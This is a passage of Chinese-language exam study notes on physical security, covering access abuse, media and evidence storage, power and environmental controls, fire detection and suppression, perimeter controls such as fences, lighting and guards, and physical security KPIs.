访问滥用</h2><p>无论哪种形式的物理访问控制，都需要配备安保人员或其他监视系统来防止滥用行为。</p><p>滥用事例：</p><p>1、支持打开安全大门或故障开启出口（fail-safe exits）</p><p>2、绕过门锁或访问控制</p><p>“假冒”（impersonation）和“伪装”是指冒用他人的安全 ID 来获得访问权限。</p><p>“尾随”（tailgating）和“捎带”（piggybacking）是利用授权人员获得未经授权进入的手段。</p><p>物理访问控制，审计踪迹和访问日志是有效的技术手段。</p><p>日志可以手工记录，也可以自动记录。</p><p>日志信息包括：</p><p>事件发生的时间</p><p>身份认证过程的结果</p><p>安全门打开的持续时间</p><p>安全摄像头和日志结合对比参照。</p><h2 id="10-2-7-介质存储设施"><a href="#10-2-7-介质存储设施" class="headerlink" title="10.2.7 介质存储设施"></a>10.2.7 介质存储设施</h2><p>介质存储设施用于安全存储空白介质、可重用介质及安装介质。</p><p>各种介质都应该受到严格保护，以免被盗或受损。</p><p>保护措施：带锁的储藏柜或壁橱，保险箱</p><p>空白介质：防止被偷窃和植入恶意软件。</p><p>可擦写介质（如U盘，闪存卡或移动硬盘）：防止被偷窃或进行数据残余恢复。</p><p>“数据残余”是指存储设备经过不充分的清楚过程后依然残留的数据。</p><p>安装介质：防止被盗窃或植入恶意软件。</p><p>常见实现安全介质存储设施方法：</p><ul><li>将存储介质保存在上锁的柜子或保险箱里</li><li>将介质存放在上锁的柜子里，并指定专人进行管理</li><li>建立检入&#x2F;检出制度，跟踪库中介质的查找、使用和归还行为</li><li>当可重用介质被归还时，执行介质净化与清零过程（使用全零这样的无意义数据进行改写），以清除介质中的数据残余。</li><li>采用基于哈希的完整性检查机制来校验文件的有效性，或验证介质是否得到了彻底净化并不再残留以前的数据。</li></ul><p>保险箱是可移动、安全的容器，没有和建筑集成。</p><p>保险库是集成到建筑结构中的永久性保险箱或库房。</p><p>高要求可以在介质上打上安全提示标签，在介质上使用 RFID&#x2F;NFC 资产追踪标记，防水、防火、防磁以及温度监视和保护。</p><h2 id="10-2-8-证据存储"><a href="#10-2-8-证据存储" class="headerlink" title="10.2.8 证据存储"></a>10.2.8 证据存储</h2><p>事故响应的一个关键部分是收集证据以进行根本原因分析。</p><p>安全证据存储要求：</p><ul><li>使用与生产网络完全不同的专用存储系统</li><li>如果没有新数据需要存入，应该让存储系统保持离线状态</li><li>关闭存储系统与互联网的连接</li><li>跟踪证据存储系统上的所有活动</li><li>计算存储在系统中的所有数据的哈希值</li><li>只有安全管理员和法律顾问才能访问</li><li>对存储在系统中的所有数据进行加密</li></ul><h2 id="10-2-9-受限区与工作区安全"><a href="#10-2-9-受限区与工作区安全" class="headerlink" title="10.2.9 受限区与工作区安全"></a>10.2.9 受限区与工作区安全</h2><p>设施内所有区域的访问等级不能是整齐划一的。</p><p>存放高价值或非常重要的资产的区域，应该受到更严格的访问限制。</p><p>墙与隔断可以分隔不同的工作区域，可以防止无意的肩窥（shoulder surfing）或偷听行为。</p><p>清洁办公桌政策可以减少敏感信息的披露。</p><p>每个工作区都应该按照 IT 资产分级进行评估和分级，分配不同的访问和限制级别。</p><p>访客管理：建立访客陪护制度、建立访客控制措施、配备钥匙门锁等基础物理安全工具、配备访问控制前台、视频摄像头、日志记录、安全警卫及 RFID ID 标签机制。</p><p>敏感隔离间信息设施（sensitive compartmented information facility，SCIF）</p><p>SCIF 目的是存储、检查以及更新敏感的隔离信息（sensitive compartmented information，SCI）</p><p>SCIF 内数据的访问受到严格限制。</p><p>SCIF 禁止在安全区内使用拍照、摄像设备或其他记录设备。</p><p>SCIF 可以建造的陆地、飞行器或漂浮平台。</p><p>SCIF 可以是一个永久性建筑，也可以是临时设施。</p><h2 id="10-2-10-基础设施关注点"><a href="#10-2-10-基础设施关注点" class="headerlink" title="10.2.10 基础设施关注点"></a>10.2.10 基础设施关注点</h2><h3 id="1-电力"><a href="#1-电力" class="headerlink" title="1. 电力"></a>1. 电力</h3><p>电力公司的电力供应并不是持续和洁净的。</p><h4 id="电力供应改善方法"><a href="#电力供应改善方法" class="headerlink" title="电力供应改善方法"></a>电力供应改善方法</h4><p><strong>第一级别</strong>：使用浪涌保护器</p><p>使用前提：当瞬间断电不会对设备造成损坏或损失时使用</p><p><strong>第二级别</strong>：使用电源或线路调节器</p><p><strong>第三级别</strong>：使用“不间断电源”（uninterruptible power supply，UPS）。</p><p>UPS 提供备份电源，提供浪涌保护和电源调节。</p><p>UPS 类型：</p><p>双变换（double conversion）</p><p>在线交互（line interactive）</p><p>双变换 UPS：</p><p>从插座中获取电力，并将电力存储在电池中，再将电池里存储的电力供给所连接的设备。</p><p>在线交互 UPS：</p><p>有浪涌保护器、电池充电&#x2F;逆变器以及位于电网电源及设备间的电压调节器。</p><p>供电中断时，低端版本 UPS 可能会导致短时中断，存在损坏敏感设备或导致设备关机重启。</p><p>UPS 也被称为备份或备用 UPS。</p><p>UPS 持续时间取决于电池容量和连接设备所需的功率（即负载）</p><p>关键系统持续供电，非关键系统切断供电。</p><p>备用电池或故障转换电池</p><p>也可以使用备用电池或故障转换电池，一般用于为整个建筑供电。</p><p>传统版本瞬间断电切换，现代电池不会中断电源。</p><p><strong>最高级别</strong></p><p>使用发电机</p><p>使用发电机也需要使用 UPS ，UPS 目的是提供足以让系统正常关机的电源，或持续供电，直到发电机通电并提供稳定的电源。</p><h4 id="电力术语"><a href="#电力术语" class="headerlink" title="电力术语"></a>电力术语</h4><ul><li>故障（fault）：瞬时断电</li><li>停电（blackout）：完全失去电力供应</li><li>电压骤降（sag）：瞬时低电压</li><li>低电压（brownout）：长时间低电压</li><li>尖峰（spike）：瞬时高电压</li><li>浪涌（surge）：长时间高电压</li><li>合闸电流（inrush）：通常是接入电源（主电源、替代&#x2F;副电源）</li><li>接地（ground）：电路中接地导线将电流导入大地。</li></ul><h3 id="2-噪声"><a href="#2-噪声" class="headerlink" title="2. 噪声"></a>2. 噪声</h3><p>噪声是某种形式的紊乱、插入或波动的功率产生的干扰。</p><p>瞬态噪声：不连续的噪声</p><p>噪声影响设备电源正常工作，干扰通信、传输以及播放的质量。</p><p>“电磁干扰”（electromagnetic interference，EMI）类型：</p><p>1、普通模式</p><p>“普通模式噪声”是由电源火线与地线间的电压差或操作电气设备而产生的。</p><p>2、穿透模式</p><p>“穿透模式噪声”是由火线与零线间的电压差或操作电气设备产生的。</p><p>“无线电频率干扰”（radio-frequency interference，RFI）能够干扰很多系统的正常工作。</p><p>RFI 来源电器：</p><p>荧光灯</p><p>电缆</p><p>电加热器</p><p>计算机</p><p>电梯</p><p>电机</p><p>电磁铁</p><p>务必使电源与设备免受噪声的影响。</p><h4 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h4><p>提供充足的电力供应</p><p>建立正确的接地</p><p>采用屏蔽电缆</p><p>将电缆铺设在屏蔽干扰的管道中</p><p>使用光纤网络</p><p>使铜缆远离 EMI 和 RFI 发射源</p><h3 id="3-温度、湿度与静电"><a href="#3-温度、湿度与静电" class="headerlink" title="3. 温度、湿度与静电"></a>3. 温度、湿度与静电</h3><p>HVAC 系统的控制</p><h4 id="温度"><a href="#温度" class="headerlink" title="温度"></a>温度</h4><h5 id="温度控制在特定范围"><a href="#温度控制在特定范围" class="headerlink" title="温度控制在特定范围"></a>温度控制在特定范围</h5><p>温度范围：</p><p>59～89.6华氏度（15～32摄氏度）之间</p><p>防止设备达到可能导致损坏的温度，优化与设备性能和湿度管理相关的温度。</p><p>温度管理使用风扇进行优化。</p><p>风扇可以连接设备上的散热器，抽出热空气，补充冷空气。</p><p>冷、热通道是大型服务器机房中保持工作温度的一种方式。</p><p>机房气流系统中上升的热空气被天花板上的进气口捕获，而冷空气则从相反的通道（天花板或地板）送回。</p><h5 id="温度保持稳定"><a href="#温度保持稳定" class="headerlink" title="温度保持稳定"></a>温度保持稳定</h5><p>温度上限波动的热振荡会使材料膨胀和收缩，可能会导致芯片蠕变或焊接点出现裂纹。</p><p>数据中心保持正气压，并保持较高的空气过滤水平。</p><h4 id="湿度和静电"><a href="#湿度和静电" class="headerlink" title="湿度和静电"></a>湿度和静电</h4><p>机房湿度应该保持在 20% ～ 80%。</p><p>湿度太高会发生冷凝作用，腐蚀计算机中的配件。</p><p>湿度太低会产生静电，导致静电放电（ESD）。</p><p>静电电压与破坏力</p><table><thead><tr><th>静电电压</th><th>可能造成的破坏</th></tr></thead><tbody><tr><td>40</td><td>损坏敏感电路和其他电子部件</td></tr><tr><td>1000</td><td>干扰显示器工作</td></tr><tr><td>1500</td><td>破坏硬盘上存储的数据</td></tr><tr><td>2000</td><td>系统突然关机</td></tr><tr><td>4000</td><td>打印机塞纸或部件损坏</td></tr><tr><td>17 000</td><td>电路永久损坏</td></tr></tbody></table><p>环境检测关注问题：</p><p>温度</p><p>湿度</p><p>灰尘</p><p>烟雾</p><p>废弃物</p><p>化学</p><p>生物</p><p>放射性</p><p>微生物探测器</p><h3 id="水的问题"><a href="#水的问题" class="headerlink" title="水的问题"></a>水的问题</h3><p>服务器间、数据中心与关键计算机设备都要位于建筑中远离水源或水管的位置。</p><p>关键系统周围，在地板或数据中心的架空地板下面安装漏水探测绳</p><p>需要知道水阀和排水系统位置</p><p>评估处理洪水能力，是否具备足够的排水能力等</p><h2 id="10-2-11-火灾预防、探测与消防"><a href="#10-2-11-火灾预防、探测与消防" class="headerlink" title="10.2.11 火灾预防、探测与消防"></a>10.2.11 火灾预防、探测与消防</h2><p>任何安全与保护系统的首要目标是保障人身的安全。</p><p>火灾探测与消防系统的设计还应该努力将火、烟及热量造成的财产损失降到最低，并减少灭火剂的使用。</p><p>火灾三要素&#x2F;火灾三角形</p><p>燃料</p><p>热量</p><p>氧气</p><p>三要素间发生的化学反应</p><p>不同灭火剂解决不同的问题</p><ul><li>水降低温度</li><li>碳酸钠和其他干粉灭火剂阻断燃料的供应</li><li>二氧化碳抑制氧气的供应</li><li>哈龙替代物和其他不可燃气体干扰燃烧的化学反应和抑制氧气供应</li></ul><p>灭火剂选择考虑因素</p><ul><li>考虑针对火灾三角形的哪些方面</li><li>灭火剂效果</li><li>灭火剂对环境的影响</li></ul><p>火灾发展阶段</p><ul><li>阶段1：早期阶段只有空气电离，没有烟雾产生</li><li>阶段2：在烟雾阶段，可以看到烟雾从着火点冒出</li><li>阶段3：在火焰阶段，用肉眼就能看见火焰</li><li>阶段4：在炙热阶段，火场温度沿着时间轴急剧升高，火场中聚集了大量热量，其中的任何可燃物都燃烧起来。</li></ul><p>防火管理基础：适当的人员防火意识培训</p><p>培训安全和逃生方面：熟悉消防原理，熟悉逃生通道，知晓如何发现逃生通道。</p><p>培训如何发现与使用灭火器</p><p>通用应急培训内容：心肺复苏（CPR）、紧急关机程序、一般急救、自动体外除颤器（AED），以及预设集合点或安全验证机制（如语音邮箱）。</p><p>定期通过演练和模拟对培训进行测试。</p><p>常见火灾原因：</p><p>1、电源插座过载</p><p>2、加热装置靠近易燃材料时使用不当</p><h3 id="1-灭火器"><a href="#1-灭火器" class="headerlink" title="1. 灭火器"></a>1. 灭火器</h3><p>灭火器在火灾前三个阶段有效。</p><p>常见灭火器类别</p><table><thead><tr><th>类别</th><th>类型</th><th>灭火剂</th></tr></thead><tbody><tr><td>A</td><td>普通燃烧物</td><td>水、碳酸钠（一种干粉或化学药水）</td></tr><tr><td>B</td><td>液态</td><td>二氧化碳、哈龙、碳酸钠</td></tr><tr><td>C</td><td>电气火灾</td><td>二氧化碳、哈龙</td></tr><tr><td>D</td><td>金属</td><td>干粉</td></tr><tr><td>K</td><td>烹饪油脂</td><td>碱性混合物（如醋酸钾、柠檬酸钾或碳酸钾，可与油脂发生皂化反应）</td></tr></tbody></table><p>水和其他液体不能用于 B&#x2F;K 类火灾，会蒸发，导致爆炸，并扩散可燃液体。</p><p>水也不能用于 C  类火灾，存在触电危险。</p><p>氧气抑制剂不能用于金属火灾，燃烧的金属会产生氧气。</p><h3 id="2-火灾探测系统"><a href="#2-火灾探测系统" class="headerlink" title="2. 火灾探测系统"></a>2. 火灾探测系统</h3><h4 id="火灾探测系统类型"><a href="#火灾探测系统类型" class="headerlink" title="火灾探测系统类型"></a>火灾探测系统类型</h4><h5 id="固定温度探测系统"><a href="#固定温度探测系统" class="headerlink" title="固定温度探测系统"></a>固定温度探测系统</h5><p>在环境达到特定温度时会触发灭火装置。</p><p>最常见的探测器类型。</p><p>价格低廉，可长时间保持可靠性。</p><h5 id="上升率探测系统"><a href="#上升率探测系统" class="headerlink" title="上升率探测系统"></a>上升率探测系统</h5><p>在温度的上升速率达到特定值时启动灭火功能。</p><p>冬季加热产生误报，没有广泛应用。</p><h5 id="火焰驱动系统"><a href="#火焰驱动系统" class="headerlink" title="火焰驱动系统"></a>火焰驱动系统</h5><p>依靠火焰的红外热能触发灭火装置。</p><p>快速、可靠，价格昂贵。</p><p>高风险环境使用。</p><h5 id="烟雾驱动系统"><a href="#烟雾驱动系统" class="headerlink" title="烟雾驱动系统"></a>烟雾驱动系统</h5><p>将光电或辐射电离传感器用作触发器。</p><p>监测空气中的微粒对光或辐射的阻碍。</p><p>烟雾、灰尘和蒸汽都会触发警报。</p><h5 id="早期（火情）烟雾探测系统"><a href="#早期（火情）烟雾探测系统" class="headerlink" title="早期（火情）烟雾探测系统"></a>早期（火情）烟雾探测系统</h5><p>也称为吸气式传感器，能够探测出燃烧早期阶段产生的化学物质。</p><p>最昂贵，仅用于高风险或关键的环境中。</p><p>火灾警报应该明显、令人震惊、引人注意，应该确保不会出现误会或忽视。</p><p>人性化的环境中，水是常用灭火剂。</p><p>没有人员驻留的机房，气体消防系统合适。</p><h3 id="3-喷水消防系统"><a href="#3-喷水消防系统" class="headerlink" title="3. 喷水消防系统"></a>3. 喷水消防系统</h3><h4 id="四种喷水灭火系统"><a href="#四种喷水灭火系统" class="headerlink" title="四种喷水灭火系统"></a>四种喷水灭火系统</h4><h5 id="湿管系统-封闭喷头系统"><a href="#湿管系统-封闭喷头系统" class="headerlink" title="湿管系统&#x2F;封闭喷头系统"></a>湿管系统&#x2F;封闭喷头系统</h5><p>水管中一直充满水，打开灭火功能时，立刻喷洒灭火</p><h5 id="干管系统"><a href="#干管系统" class="headerlink" title="干管系统"></a>干管系统</h5><p>充满压缩惰性气体，打开灭火功能时，释放气体，供水阀门开启，进水喷洒灭火</p><h5 id="预响应系统"><a href="#预响应系统" class="headerlink" title="预响应系统"></a>预响应系统</h5><p>干管系统的变体，使用两级检测和释放机制。</p><p>探测到可能的火灾因素，管道会被允许注水（第 1 阶段），当环境的热量达到触发喷淋头上的触发器时，管中的水才会释放出来（第 2 阶段）。</p><p>允许组织在喷淋头触发前通过人工干预。</p><h5 id="密集洒水系统"><a href="#密集洒水系统" class="headerlink" title="密集洒水系统"></a>密集洒水系统</h5><p>采用更粗的管道，可以输送更大的水量。</p><p>不适用于存放电子仪器与计算机的环境。</p><p><strong>预响应系统是最适合人机共存环境的喷水灭火系统</strong>。</p><h3 id="4-气体消防系统"><a href="#4-气体消防系统" class="headerlink" title="4. 气体消防系统"></a>4. 气体消防系统</h3><p>气体消防系统使用压缩气体高效灭火。</p><p>气体消防系统不可以用于有人员常驻的环境，因为气体消防系统会清除空气中所有的氧气。</p><p>常用的压缩气体：</p><p>二氧化碳</p><p>哈龙</p><p>FM-200（一种哈龙替代品）</p><p>气体灭火的好处：</p><p>对计算机系统造成的损害最小</p><p>比水基系统更有效，更快</p><p>二氧化碳：</p><p>封闭空间，浓度达到 7.5% 就可能导致窒息，二氧化碳灭火剂的使用浓度通常为 34% 或更高。</p><p>无人场所且水基系统不适用的特殊情况下使用</p><p>降低温度，排出火灾现场氧气。</p><p>哈龙：</p><p>耗尽氧气来阻止燃烧</p><p>900 华氏度，会分解出有毒气体</p><p>消耗臭氧</p><p>低压水雾来取代哈龙替代品</p><p>不能在机房或电气设备存储间使用</p><h3 id="5-破坏"><a href="#5-破坏" class="headerlink" title="5. 破坏"></a>5. 破坏</h3><p>火灾的破坏因素：</p><p>烟</p><p>高温</p><p>水或碳酸钠灭火剂</p><h1 id="10-3-物理安全的实现和管理"><a href="#10-3-物理安全的实现和管理" class="headerlink" title="10.3 物理安全的实现和管理"></a>10.3 物理安全的实现和管理</h1><p>标识可用于向未经授权的人员宣告受控区域，指示该区域正在使用安全摄像头，并展示安全警告。</p><p>标识有助于阻止轻微的犯罪活动，建立记录事件的基础，并引导人们遵守规则或安全预防措施。</p><p>标识通常是文字或图像的物理显示。</p><h2 id="10-3-1-边界安全控制"><a href="#10-3-1-边界安全控制" class="headerlink" title="10.3.1 边界安全控制"></a>10.3.1 边界安全控制</h2><p>出入的方便性受到边界安全需要的制约。</p><h3 id="1-围栏、门、旋转门与访问控制门厅"><a href="#1-围栏、门、旋转门与访问控制门厅" class="headerlink" title="1. 围栏、门、旋转门与访问控制门厅"></a>1. 围栏、门、旋转门与访问控制门厅</h3><h4 id="围栏"><a href="#围栏" class="headerlink" title="围栏"></a>围栏</h4><p>“围栏”是一种边界界定装置。</p><p>划分出处于特定安全保护级别的内外区域。</p><p>常见类型：</p><ul><li>3～4 英尺的围栏可吓阻无意穿越者</li><li>6～7 英尺的围栏难以攀爬，可吓阻大多数入侵者，但对于坚定的入侵者无效。</li><li>8 英尺以上的围栏，外加带刺的铁丝网，甚至可以吓阻坚定的入侵者。</li></ul><p><strong>周界入侵检测和评估系统（PIDAS）</strong></p><p>围栏的高级形式</p><p>PIDAS 是协同使用两个或三个围栏以提升安全性的围栏系统。</p><p>出现于军事地点和监狱周围。</p><p>PIDAS 内部为 8～20 英尺高的主围栏，主围栏可能带电，可能有铁丝网，可能包括触摸检测技术。</p><p>主围栏被外部围栏包围，外部围栏可能只有 4～6 英尺高。</p><p>外部围栏的目的是防止动物和临时入侵者进入主围栏。降低有害警报率（NAR）或来自内部围栏上的动物或树叶的误报。</p><p>其他围栏位于主围栏和外部围栏之间，围栏之间间隙可以充当警卫巡逻或警犬的走廊，走廊没有植被。</p><h4 id="门"><a href="#门" class="headerlink" title="门"></a>门</h4><p>围栏中可控的入口。</p><p>门的威慑级别在功能上必须等同于围栏的威慑级别。</p><p>对铰链和门锁进行加固。</p><p>门关闭后，不能有其他额外可以出入的漏洞。</p><p>将门的数量降至最低。</p><p>每个门都应该处于警卫的监视之下。</p><p>没有警卫监视的门需要有警犬或安全摄像头进行监控。</p><h4 id="旋转门"><a href="#旋转门" class="headerlink" title="旋转门"></a>旋转门</h4><p>一种特殊形式的门。</p><p>特殊性在于：每次只允许通过一个人，并且主能朝着一个方向转动。</p><p>常用于只能进不能出的场合或只能出不能进的场合。</p><p>锁定机制需要单个人员在进入安全区域之间提供密码或凭证。</p><p>可被用于人流控制装置，以限制进入方向和速度。</p><h4 id="访问控制门厅"><a href="#访问控制门厅" class="headerlink" title="访问控制门厅"></a>访问控制门厅</h4><p>也被称为 “捕人陷阱”</p><p>是一种配备警卫的内、外双道门机构，或是其他类型的能防止捎带跟入的物理机关。</p><p>捕人陷阱的作用是暂时控制目标，以对目标进行身份认证和识别。</p><p>延迟特性：目标因为擅自闯入而被捕。</p><p>访问控制门厅通常兼具防止逼近和尾随两种功能。</p><p>访问控制门厅可用于控制设施的入口或设施内通往更高安全区域的入口。</p><h4 id="安全隔离桩"><a href="#安全隔离桩" class="headerlink" title="安全隔离桩"></a>安全隔离桩</h4><p>作用：防止车辆的闯入。</p><p>可能是固定的永久设施，也可能是在固定时间或响起警报时自动从基座升起的设施。</p><h4 id="路障"><a href="#路障" class="headerlink" title="路障"></a>路障</h4><p>K 型拒马</p><p>大花盆</p><p>锯齿阵列</p><p>护柱</p><p>破胎机</p><h3 id="2-照明"><a href="#2-照明" class="headerlink" title="2. 照明"></a>2. 照明</h3><p>照明是最常用的提供安全威慑效果的边界安全控制形式。</p><p>照明的主要目的：</p><p>阻止偶然的闯入者、侵入者、盗贼，或者是有偷窃企图的人，比如故意破坏、盗窃和在黑暗中游荡的人。</p><p>外部照明在黄昏至黎明期间打开。</p><p>内部照明可以始终打开、手动切换或按需触发。</p><p>关键区域（出口和逃生路线）安装应急照明，断电或火灾警报响起时触发。</p><p>照明是最常用的物理安全机制。</p><p>除非是低安全等级场所，不能将照明作为主要的或单一的安全防护机制。</p><p>照明不需要用于暴露保安、警犬、巡逻岗或其他类似的安全警卫。</p><p>照明应与保安、警犬、安全摄像头以及其他形式的入侵检测或监控机制结合在一起使用。</p><p>照明一定不能干扰周围居民的正常生活以及道路、铁路、机场等的正常运行，也不能直接或间接照射保安、警犬与监视设备。</p><p>用于边界保护的照明，一般业界接受的标准是：关键区域的照明强度应该至少达到 2 尺烛光（约为 2 流明或 20 勒克斯）。</p><p>探照灯的位置，标准建议将灯杆立在照明区域“直径”远的距离。</p><p>灯杆定位允许地面照明区域的交叉。</p><h3 id="3-安全警卫与警犬"><a href="#3-安全警卫与警犬" class="headerlink" title="3. 安全警卫与警犬"></a>3. 安全警卫与警犬</h3><p>安全警卫的职责是进行干预阻止真实的入侵与攻击行为。</p><p>警卫可以站在边界或内部，时刻监视出入口，时刻注视探测与监控画面。</p><p>警卫优点：</p><p>适应各种条件并对各种情况做出反应。</p><p>学习并识别出攻击活动及模式，可以针对环境的变化做出调整，能够做出决策并发出判断指令。</p><p>警卫不清楚设施的整体运营，有助于减少保安人员涉嫌泄露机密信息的可能性。</p><p>警卫应该在内部和外部进行巡逻。</p><p>巡逻应该是经常性的，间隔是随机的。</p><p>警卫缺陷：</p><p>不是所有环境与设施都适合使用安全警卫。</p><p>不是所有的安全警卫都是可靠的。</p><p>警卫不清楚设施的整体运营，无法面面俱到，不能对每一种情况都做出反应。</p><p>警卫都是很昂贵的。</p><p>警犬可以替代安全警卫的作用，用于边界安全控制。</p><p>警犬是一种非常有效的探测与威慑手段。</p><p>警犬需要精心喂养，还需要昂贵的保险以及认真的看护。</p><p>巡逻机器人（robot sentries）可以用来自动巡逻一个区域。</p><p>通常使用面部识别确认被授权的个人以及潜在的入侵者。</p><p>可以是轮式的，也可以是无人机</p><h2 id="10-3-2-内部安全控制"><a href="#10-3-2-内部安全控制" class="headerlink" title="10.3.2 内部安全控制"></a>10.3.2 内部安全控制</h2><p>存在限制区来控制物理安全时，需要采取针对访客的控制措施。</p><p>常见控制措施：</p><ul><li>陪护人员</li><li>钥匙（key）</li><li>密码锁（combination lock）</li><li>胸卡（badge）</li><li>动作探测器（motion detector）</li><li>入侵警报（intrusion alarm）</li></ul><p>前台可作为阻止未经授权的访问进入的点。</p><p>锁住的门将接待区与安全区隔离，用安全摄像头进行监控。</p><p>访客日志是一种手动或自动填写的表格，记录非员工对某个设施或位置的访问。</p><p>访问日志可用于跟踪和验证。</p><p>维护物理访问日志，通过智能卡自动创建或保安手动创建。</p><p>物理访问日志可以解释设备访问的逻辑日志，有助于确定人员是否在紧急情况下逃离建筑物。</p><h3 id="1-钥匙与密码锁"><a href="#1-钥匙与密码锁" class="headerlink" title="1. 钥匙与密码锁"></a>1. 钥匙与密码锁</h3><p>门锁的设计与使用是为了防止未授权人员的出入。</p><p>锁是一种较原始的识别与认证机制。</p><p>钥匙锁是最常见、最便宜的物理安全控制装置，常被称为“预设锁具”、插销锁或传统锁。</p><p>该类锁容易被打开，被称为“shimming 攻击”。</p><p>可编程锁与密码锁的控制功能强于预置锁。</p><p>锁能替代警卫充当边界入口的访问控制设备。</p><h3 id="2-环境与生命安全"><a href="#2-环境与生命安全" class="headerlink" title="2. 环境与生命安全"></a>2. 环境与生命安全</h3><p>物理访问控制以及设施安全保护的一个重要方面是：</p><p>保护环境基本要素的完好和人员生命安全</p><p>防止人身伤害成为所有安全方案的首要目标。</p><p>维护设施环境的正常秩序是保护人员安全的一部分。</p><p>物理安全程序应该首先保护人员生命安全，然后恢复环境安全，并使 IT  设备所需的基础设施恢复正常工作</p><p>人员始终都应该处于第一位。</p><p>居住者紧急计划（occupant emergency plan，OEP），指导与协助人员安全的维护。</p><p>提供指导或讲授方法</p><ul><li>如何最大限度减少安全威胁，防止受伤，缓解压力</li></ul><p>OEP 不解决 IT相关或业务连续性问题。</p><p>业务连续性计划（business continuity plan，BCP）与灾难恢复计划（disaster recovery plan，DRP）解决 IT 及业务连续性与恢复问题。</p><h3 id="3-监管要求"><a href="#3-监管要求" class="headerlink" title="3. 监管要求"></a>3. 监管要求</h3><p>遵守所有适用的法律要求，也是维持安全的关键一环。</p><p>法律要求可能涉及的点：</p><ul><li>软件的使用许可</li><li>雇佣条件限制</li><li>对敏感材料的处理</li><li>对安全法规的遵守</li></ul><h2 id="10-3-3-物理安全的关键性能指标"><a href="#10-3-3-物理安全的关键性能指标" class="headerlink" title="10.3.3 物理安全的关键性能指标"></a>10.3.3 物理安全的关键性能指标</h2><p>应该确定、监控、记录和评估物理安全的关键绩效指标（KPI）。</p><p>KPI  是物理安全各个方面的操作或故障标准。</p><p>目的是评估安全工作的有效性。</p><p>安全的总体目标是降低风险，以便以经济高效的方式实现阻止的目标。</p><p>物理安全 KPI  常见和潜在示例：</p><ul><li>成功入侵的数量</li><li>成功犯罪的数量</li><li>成功事故数</li><li>成功中断的次数</li><li>未成功的入侵次数</li><li>未成功犯罪的数量</li><li>未成功事故数</li><li>未成功中断的次数</li><li>检测事故的时间</li><li>评估事故的时间</li><li>响应事故的时间</li><li>从事故中恢复的时间</li><li>事故发生后恢复正常状态的时间</li><li>事故对组织的影响程度</li><li>误报次数（即错误检测警报）</li></ul><p>应该为每个 KPI 建立基线，并保存每个指标的记录。</p><p>历史记录和基线对于执行趋势分析和了解物理安全机制的性能是有必要的。</p><p>自动收集的 KPI 是首选。</p><p>手动 KPI  测量更为重要，需要关注和集中收集。</p><p>每个事故响应操作，都应该以经验教训总结阶段结束。</p><p>通过可靠的 KPI 评估，组织可以识别缺陷，评估改进，评估响应措施，对物理安全控制执行安全投资回报（ROSI）和成本&#x2F;效益分析。</p><h1 id="考试要点"><a href="#考试要点" class="headerlink" title="考试要点"></a>考试要点</h1><h2 id="理解为什么没有物理安全就无安全可言"><a href="#理解为什么没有物理安全就无安全可言" class="headerlink" title="理解为什么没有物理安全就无安全可言"></a>理解为什么没有物理安全就无安全可言</h2><p>如果没有对物理环境的控制，再多的管理类或技术类&#x2F;逻辑类访问控制技术都无法提供足够的安全性。</p><p>如果怀有恶意的人员获取了对设施或设备的物理访问权，那么他们几乎可以为所欲为，包括破坏设备、窃取或更改数据。</p><h2 id="理解安全设施计划"><a href="#理解安全设施计划" class="headerlink" title="理解安全设施计划"></a>理解安全设施计划</h2><p>安全设施计划概述了组织的安全需求，并强调了提供安全的方法或机制。</p><p>该计划是通过风险评估和关键路径分析制定的。</p><h2 id="定义关键路径分析"><a href="#定义关键路径分析" class="headerlink" title="定义关键路径分析"></a>定义关键路径分析</h2><p>关键路径分析是一项系统性工作，旨在确定任务关键型应用程序、流程、运营以及所有必要的支撑元素之间的关系。</p><h2 id="了解技术融合"><a href="#了解技术融合" class="headerlink" title="了解技术融合"></a>了解技术融合</h2><p>技术融合是指随着时间的推移，各种技术、解决方案、实用程序和系统不断发展和融合的趋势。</p><p>虽然在某些情况下，这可以提高效率和节约成本，但是它也可能产生单点故障，进而成为恶意黑客和入侵者更有价值的目标。</p><h2 id="理解站点选择"><a href="#理解站点选择" class="headerlink" title="理解站点选择"></a>理解站点选择</h2><p>站点的选择应基于组织的安全需求。</p><p>成本、位置和规模都很重要，但始终应该优先考虑安全要求。</p><p>站点选择的关键要素有可见性、周围环境和构成、区域的便利性等。</p><h2 id="了解建筑设施设计的关键要素"><a href="#了解建筑设施设计的关键要素" class="headerlink" title="了解建筑设施设计的关键要素"></a>了解建筑设施设计的关键要素</h2><p>建设设施设计的一个关键要素是在建造前理解组织需要的安全级别，并为此制定周详的计划。</p><h2 id="定义-CPTED"><a href="#定义-CPTED" class="headerlink" title="定义 CPTED"></a>定义 CPTED</h2><p>环境设计预防犯罪（CPTED）的理念是通过精心设计物理环境来影响潜在犯罪者在实施犯罪行为之前所做的个人决定。</p><h2 id="能够列出管理类物理安全控制"><a href="#能够列出管理类物理安全控制" class="headerlink" title="能够列出管理类物理安全控制"></a>能够列出管理类物理安全控制</h2><p>管理类物理安全控制：</p><p>设施建造与选择</p><p>站点管理</p><p>人员控制</p><p>安全意识培训</p><p>应急响应与流程</p><h2 id="能够列出技术类物理安全控制"><a href="#能够列出技术类物理安全控制" class="headerlink" title="能够列出技术类物理安全控制"></a>能够列出技术类物理安全控制</h2><p>技术类物理安全控制：</p><p>建筑访问控制</p><p>入侵检测</p><p>警报</p><p>安全摄像头</p><p>监视</p><p>HVAC的电力供应</p><p>火警探测与消防</p><h2 id="能够列出现场类物理安全控制"><a href="#能够列出现场类物理安全控制" class="headerlink" title="能够列出现场类物理安全控制"></a>能够列出现场类物理安全控制</h2><p>现场类物理安全控制：<br>围栏</p><p>照明</p><p>门锁</p><p>建筑材料</p><p>访问控制门厅（以前称为陷阱）</p><p>警卫</p><p>警犬</p><h2 id="了解控制的功能顺序"><a href="#了解控制的功能顺序" class="headerlink" title="了解控制的功能顺序"></a>了解控制的功能顺序</h2><p>威慑</p><p>拒绝</p><p>检测</p><p>延迟</p><p>判定</p><p>决定</p><h2 id="理解设备故障"><a href="#理解设备故障" class="headerlink" title="理解设备故障"></a>理解设备故障</h2><p>无论组织选择购买和安装的设备质量如何，它们最终都会出现故障。</p><p>故障准备措施包括购买备件、存储设备或与供应商签订 SLA。</p><h2 id="定义-MTTF、MTTR-和-MTBF"><a href="#定义-MTTF、MTTR-和-MTBF" class="headerlink" title="定义 MTTF、MTTR 和 MTBF"></a>定义 MTTF、MTTR 和 